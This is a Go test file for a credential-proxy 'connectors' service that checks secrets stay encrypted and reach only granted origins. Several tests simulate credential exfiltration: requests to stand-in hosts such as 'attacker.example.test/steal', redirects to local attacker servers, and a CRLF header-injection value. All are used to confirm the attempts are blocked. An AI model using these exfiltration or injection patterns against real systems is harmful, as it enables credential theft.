package connectors

import (
	"context"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"

	"github.com/momja/Exhibit/internal/egress"
	"github.com/momja/Exhibit/internal/secrets"
	"github.com/momja/Exhibit/internal/store"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func testService(t *testing.T) (*Service, string) {
	t.Helper()
	path := filepath.Join(t.TempDir(), "app.db")
	db, err := store.OpenSQLite(path)
	require.NoError(t, err)
	t.Cleanup(func() { db.Close() })
	box, err := secrets.Load("connection-test-key", "")
	require.NoError(t, err)
	s := New(Config{Store: db, Box: box, StandinsEnabled: true, GateFactory: func(origins []string) (*egress.Gate, error) { return egress.NewForTests(origins, egress.Limits{}) }})
	require.NoError(t, db.PutArtifact(context.Background(), &store.Artifact{ID: "app", OwnerID: 1, Title: "Connected app", SourceBlobID: "body", Tier: store.Tier1}))
	return s, path
}
func testGate(t *testing.T, origins ...string) *egress.Gate {
	t.Helper()
	g, err := egress.NewForTests(origins, egress.Limits{})
	require.NoError(t, err)
	t.Cleanup(g.Close)
	return g
}
func doRequest(t *testing.T, s *Service, viewer int64, gate *egress.Gate, target string) (*egress.Response, error) {
	t.Helper()
	req, err := http.NewRequest(http.MethodGet, target, nil)
	require.NoError(t, err)
	return s.Do(context.Background(), viewer, "app", req, gate)
}

func TestNativeSecretsStaySealedAndOnlyReachTheGrantedOrigin(t *testing.T) {
	s, path := testService(t)
	ctx := context.Background()
	const secret = "exhibit-native-super-secret-4385"
	var seen atomic.Int32
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		seen.Add(1)
		assert.Equal(t, "Bearer "+secret, r.Header.Get("Authorization"))
		assert.Empty(t, r.Header.Get("Cookie"))
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"result":"ok","reflected":"%s"}`, r.Header.Get("Authorization"))
	}))
	defer provider.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "Personal API", Recipe: "bearer", Origin: provider.URL, Secret: secret}, UnlimitedLimits())
	require.NoError(t, err)
	data, err := json.Marshal(c)
	require.NoError(t, err)
	assert.NotContains(t, string(data), secret)
	records, err := s.cfg.Store.ListConnections(ctx, 1)
	require.NoError(t, err)
	require.Len(t, records, 1)
	assert.NotContains(t, records[0].EncryptedSecret, secret)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
	require.NoError(t, err)
	gate := testGate(t, provider.URL, "https://elsewhere.example.test")
	req, err := http.NewRequest(http.MethodGet, provider.URL+"/data", nil)
	require.NoError(t, err)
	req.Header.Set("Authorization", "attacker")
	req.Header.Set("Cookie", "private-browser-cookie")
	response, err := s.Do(ctx, 1, "app", req, gate)
	require.NoError(t, err)
	assert.NotContains(t, string(response.Body), secret)
	assert.Contains(t, string(response.Body), "credential redacted")
	_, err = doRequest(t, s, 1, gate, "https://elsewhere.example.test/collect")
	assert.ErrorIs(t, err, ErrEgress)
	assert.Equal(t, int32(1), seen.Load())
	allowed, err := s.AllowedEgress(ctx, 1, "app", []string{provider.URL, "https://elsewhere.example.test"})
	require.NoError(t, err)
	assert.Equal(t, []string{provider.URL}, allowed)
	_, err = s.cfg.Store.GetConnection(ctx, 2, c.ID)
	assert.ErrorIs(t, err, store.ErrNotFound)
	_, err = s.Grant(ctx, 2, "app", GrantRequest{ConnectionID: c.ID})
	assert.ErrorIs(t, err, store.ErrNotFound)
	bytes, err := os.ReadFile(path)
	require.NoError(t, err)
	assert.NotContains(t, string(bytes), secret)
}

func TestConnectionRecipeCannotChooseDangerousCredentialHeaders(t *testing.T) {
	s, _ := testService(t)
	for _, header := range []string{"Cookie", "Host", "Origin", "Content-Length", "Proxy-Authorization", "Sec-Fetch-Site", "X-Forwarded-For", "bad\r\nheader"} {
		_, err := s.Create(context.Background(), 1, CreateRequest{Name: "Bad", Recipe: "api-key", Origin: "https://api.example.test", Header: header, Secret: "secret"}, UnlimitedLimits())
		assert.ErrorIs(t, err, ErrInvalid, header)
	}
	_, err := s.Create(context.Background(), 1, CreateRequest{Name: "Bad", Recipe: "api-key", Origin: "http://127.0.0.1", Secret: "secret"}, UnlimitedLimits())
	assert.ErrorIs(t, err, ErrInvalid)
}

func TestSimpleFINClaimCacheAndDurableQuota(t *testing.T) {
	s, path := testService(t)
	ctx := context.Background()
	var claims, requests atomic.Int32
	var provider *httptest.Server
	provider = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/claim":
			claims.Add(1)
			assert.Equal(t, http.MethodPost, r.Method)
			fmt.Fprint(w, strings.Replace(provider.URL, "https://", "https://bankuser:bank-secret-2718@", 1)+"/private-access-path")
		case "/private-access-path/accounts":
			requests.Add(1)
			u, p, ok := r.BasicAuth()
			assert.True(t, ok)
			assert.Equal(t, "bankuser", u)
			assert.Equal(t, "bank-secret-2718", p)
			w.Header().Set("Content-Type", "application/json")
			fmt.Fprint(w, `{"accounts":[{"name":"Checking","balance":"123.45"}],"errors":[]}`)
		default:
			t.Errorf("unreviewed path: %s", r.URL.Path)
			http.Error(w, "no", 404)
		}
	}))
	defer provider.Close()
	setup := base64.StdEncoding.EncodeToString([]byte(provider.URL + "/claim"))
	c, err := s.Create(ctx, 1, CreateRequest{Name: "My bank", Recipe: "simplefin", SetupToken: setup}, UnlimitedLimits())
	require.NoError(t, err)
	assert.Equal(t, "/accounts", c.Endpoint)
	assert.Equal(t, 24, c.DailyLimit)
	assert.Equal(t, int32(1), claims.Load())
	raw, err := json.Marshal(c)
	require.NoError(t, err)
	for _, secret := range []string{setup, "bankuser", "bank-secret-2718", "private-access-path"} {
		assert.NotContains(t, string(raw), secret)
	}
	records, err := s.cfg.Store.ListConnections(ctx, 1)
	require.NoError(t, err)
	assert.NotContains(t, records[0].RecipeJSON, "private-access-path")
	assert.NotContains(t, records[0].RecipeJSON, "bankuser")
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
	require.NoError(t, err)
	gate := testGate(t, provider.URL)
	for i := 0; i < 30; i++ {
		response, err := doRequest(t, s, 1, gate, provider.URL+"/accounts")
		require.NoError(t, err)
		assert.Contains(t, string(response.Body), "Checking")
	}
	assert.Equal(t, int32(1), requests.Load())
	// A new service instance reads the durable encrypted cache and quota.
	s = New(s.cfg)
	response, err := doRequest(t, s, 1, gate, provider.URL+"/accounts")
	require.NoError(t, err)
	assert.Contains(t, string(response.Body), "123.45")
	assert.Equal(t, int32(1), requests.Load())
	for i := 1; i < 24; i++ {
		_, err = doRequest(t, s, 1, gate, fmt.Sprintf("%s/accounts?start-date=%d", provider.URL, i))
		require.NoError(t, err)
	}
	_, err = doRequest(t, s, 1, gate, provider.URL+"/accounts?start-date=25")
	assert.ErrorIs(t, err, store.ErrConnectionQuota)
	assert.Equal(t, int32(24), requests.Load())
	_, err = doRequest(t, s, 1, gate, provider.URL+"/accounts?start-date=1&end-date=9000000")
	assert.ErrorIs(t, err, ErrInvalid)
	bytes, err := os.ReadFile(path)
	require.NoError(t, err)
	for _, secret := range []string{"bankuser", "bank-secret-2718", "private-access-path", "Checking", "123.45"} {
		assert.NotContains(t, string(bytes), secret)
	}
}

func TestStandinsCannotReflectOrLeaveReviewedPositions(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	const secret = "standin-real-credential-6891"
	var count atomic.Int32
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		count.Add(1)
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"echo":%q}`, r.Header.Get("Authorization"))
	}))
	defer provider.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "API", Recipe: "bearer", Origin: provider.URL, Secret: secret}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
	require.NoError(t, err)
	token, err := s.Standin(ctx, 1, "app", c.ID)
	require.NoError(t, err)
	gate := testGate(t, provider.URL, "https://attacker.example.test")
	req, _ := http.NewRequest(http.MethodGet, provider.URL+"/echo", nil)
	req.Header.Set("Authorization", "Bearer "+token.Value)
	resp, err := s.Do(ctx, 1, "app", req, gate)
	require.NoError(t, err)
	assert.NotContains(t, string(resp.Body), secret)
	assert.Contains(t, string(resp.Body), token.Value)
	for _, target := range []string{provider.URL + "/echo?value=" + url.QueryEscape(token.Value), "https://attacker.example.test/steal"} {
		req, _ = http.NewRequest(http.MethodGet, target, nil)
		req.Header.Set("Authorization", "Bearer "+token.Value)
		_, err = s.Do(ctx, 1, "app", req, gate)
		assert.Error(t, err)
	}
	req, _ = http.NewRequest(http.MethodGet, provider.URL+"/echo", nil)
	req.Header.Set("Accept", token.Value)
	_, err = s.Do(ctx, 1, "app", req, gate)
	assert.ErrorIs(t, err, ErrStandin)
	req, _ = http.NewRequest(http.MethodPost, provider.URL+"/echo", strings.NewReader(token.Value))
	_, err = s.Do(ctx, 1, "app", req, gate)
	assert.ErrorIs(t, err, ErrStandin)
	req, _ = http.NewRequest(http.MethodGet, provider.URL+"/echo", nil)
	req.Header.Set("Authorization", "Bearer "+token.Value)
	_, err = s.Do(ctx, 2, "app", req, gate)
	assert.ErrorIs(t, err, ErrStandin)
	assert.Equal(t, int32(1), count.Load())
}

func TestNativeCredentialIsNotForwardedAcrossRedirectOrigins(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	var stolen atomic.Int32
	attacker := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { stolen.Add(1) }))
	defer attacker.Close()
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { http.Redirect(w, r, attacker.URL+"/collect", 302) }))
	defer provider.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "API", Recipe: "bearer", Origin: provider.URL, Secret: "redirect-secret-9472"}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID, PermittedEgress: []string{attacker.URL}})
	require.NoError(t, err)
	_, err = doRequest(t, s, 1, testGate(t, provider.URL, attacker.URL), provider.URL+"/data")
	assert.ErrorIs(t, err, ErrEgress)
	assert.Zero(t, stolen.Load())
}

func TestSharedStateAndPublicLinksNeedExplicitConnectionConsent(t *testing.T) {
	for _, mode := range []string{"shared", "public"} {
		t.Run(mode, func(t *testing.T) {
			s, _ := testService(t)
			ctx := context.Background()
			c, err := s.Create(ctx, 1, CreateRequest{Name: "Bank", Recipe: "bearer", Origin: "https://api.example.test", Secret: "secret"}, UnlimitedLimits())
			require.NoError(t, err)
			if mode == "shared" {
				require.NoError(t, s.cfg.Store.UpdateArtifact(ctx, 1, "app", map[string]any{"share_state_mode": store.ShareStateShared}))
			} else {
				require.NoError(t, s.cfg.Store.CreateShare(ctx, 1, &store.Share{ID: "public", ArtifactID: "app"}))
			}
			_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
			assert.ErrorIs(t, err, ErrInvalid)
			g, err := s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID, ShareWithRecipients: true})
			require.NoError(t, err)
			assert.True(t, g.ShareWithRecipients)
		})
	}
}

func TestFinancialDestinationPolicyAlsoGuardsUnauthenticatedRedirects(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	var escaped atomic.Int32
	attacker := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { escaped.Add(1) }))
	defer attacker.Close()
	allowed := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { http.Redirect(w, r, attacker.URL+"/collect", 307) }))
	defer allowed.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "Bank", Recipe: "bearer", Origin: "https://bank.example.test", Secret: "private-bank-token"}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID, PermittedEgress: []string{allowed.URL}})
	require.NoError(t, err)
	_, err = doRequest(t, s, 1, testGate(t, allowed.URL, attacker.URL), allowed.URL+"/forward")
	assert.ErrorIs(t, err, ErrEgress)
	assert.Zero(t, escaped.Load())
}

func TestSimpleFINClientCanUseOnlyAStandinAccessURL(t *testing.T) {
	s, _ := testService(t)
	ctx := context.Background()
	var provider *httptest.Server
	provider = httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/claim" {
			fmt.Fprint(w, strings.Replace(provider.URL, "https://", "https://real-bank-user:real-bank-password-7592@", 1)+"/private-access")
			return
		}
		assert.Equal(t, "/private-access/accounts", r.URL.Path)
		user, password, ok := r.BasicAuth()
		assert.True(t, ok)
		assert.Equal(t, "real-bank-user", user)
		assert.Equal(t, "real-bank-password-7592", password)
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"accounts":[],"echo":%q}`, r.Header.Get("Authorization"))
	}))
	defer provider.Close()
	c, err := s.Create(ctx, 1, CreateRequest{Name: "Bank", Recipe: "simplefin", SetupToken: base64.StdEncoding.EncodeToString([]byte(provider.URL + "/claim"))}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: c.ID})
	require.NoError(t, err)
	token, err := s.Standin(ctx, 1, "app", c.ID)
	require.NoError(t, err)
	access, err := url.Parse(token.AccessURL)
	require.NoError(t, err)
	assert.Equal(t, "exhibit", access.User.Username())
	password, ok := access.User.Password()
	require.True(t, ok)
	assert.Equal(t, token.Value, password)
	assert.NotContains(t, token.AccessURL, "real-bank")
	// This is the ordinary SimpleFIN client pattern: extract Basic auth from
	// the access URL because browsers prohibit fetch URLs with userinfo.
	user := access.User.Username()
	access.User = nil
	access.Path += "/accounts"
	req, err := http.NewRequest(http.MethodGet, access.String(), nil)
	require.NoError(t, err)
	req.SetBasicAuth(user, password)
	response, err := s.Do(ctx, 1, "app", req, testGate(t, provider.URL))
	require.NoError(t, err)
	assert.NotContains(t, string(response.Body), "real-bank")
	assert.NotContains(t, string(response.Body), base64.StdEncoding.EncodeToString([]byte("real-bank-user:real-bank-password-7592")))
	assert.Contains(t, string(response.Body), token.Value)
}

func TestLegacyAmbiguousBindingsRefuseBeforeNetwork(t *testing.T) {
	s, path := testService(t)
	ctx := context.Background()
	var received atomic.Int32
	provider := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { received.Add(1) }))
	defer provider.Close()
	first, err := s.Create(ctx, 1, CreateRequest{Name: "First", Recipe: "bearer", Origin: provider.URL, Secret: "first-secret"}, UnlimitedLimits())
	require.NoError(t, err)
	second, err := s.Create(ctx, 1, CreateRequest{Name: "Second", Recipe: "bearer", Origin: provider.URL, Secret: "second-secret"}, UnlimitedLimits())
	require.NoError(t, err)
	_, err = s.Grant(ctx, 1, "app", GrantRequest{ConnectionID: first.ID})
	require.NoError(t, err)
	// Simulate a previously deployed or externally edited ambiguous row. The
	// store's current attachment path rejects this in its own transaction.
	db, err := sql.Open("sqlite", path)
	require.NoError(t, err)
	defer db.Close()
	_, err = db.Exec(`INSERT INTO artifact_connection_grants(artifact_id,connection_id,viewer_id) VALUES('app',?,1)`, second.ID)
	require.NoError(t, err)
	_, err = doRequest(t, s, 1, testGate(t, provider.URL), provider.URL+"/data")
	assert.ErrorIs(t, err, store.ErrConnectionOverlap)
	assert.Zero(t, received.Load())
}
